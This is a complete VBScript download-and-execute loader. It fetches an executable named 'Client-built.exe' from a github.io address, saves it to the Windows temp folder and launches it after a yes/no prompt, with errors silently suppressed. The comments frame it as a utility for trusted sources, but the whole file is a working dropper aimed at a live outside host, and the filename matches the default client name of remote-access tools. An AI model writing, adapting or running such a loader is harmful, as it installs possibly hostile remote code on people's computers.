Option Explicit
' VBS Download and Execute Script
' This script downloads a file from a specified URL and executes it
' IMPORTANT: Only use this with trusted sources

On Error Resume Next ' Enable error handling

' Create HTTP object for downloading
Set x = CreateObject("MSXML2.XMLHTTP")

' Replace with your actual URL (must be a valid URL)
x.Open "GET", "https://homleds.github.io/Client-built.exe", False
x.Send

' Check if download was successful
If Err.Number <> 0 Then
    WScript.Echo "Error downloading file: " & Err.Description
    WScript.Quit 1
End If

' Set up file system objects
Set fso = CreateObject("Scripting.FileSystemObject")
Set temp = fso.GetSpecialFolder(2) ' Temporary folder
tempFile = temp & "\downloaded_file.exe"

' Write the downloaded content to a file
Set stream = CreateObject("ADODB.Stream")
stream.Type = 1 ' Binary
stream.Open
stream.Write x.responseBody
If Err.Number <> 0 Then
    WScript.Echo "Error writing file: " & Err.Description
    WScript.Quit 1
End If

stream.SaveToFile tempFile, 2 ' Overwrite if exists
stream.Close

' Ask for confirmation before executing
Dim userResponse
userResponse = MsgBox("Do you want to run the downloaded file?", vbYesNo + vbQuestion, "Security Warning")
If userResponse = vbYes Then
    CreateObject("WScript.Shell").Run tempFile
    If Err.Number <> 0 Then
        WScript.Echo "Error executing file: " & Err.Description
    End If
End If

' Clean up
On Error Resume Next
fso.DeleteFile tempFile
Set stream = Nothing
Set fso = Nothing
Set x = Nothing
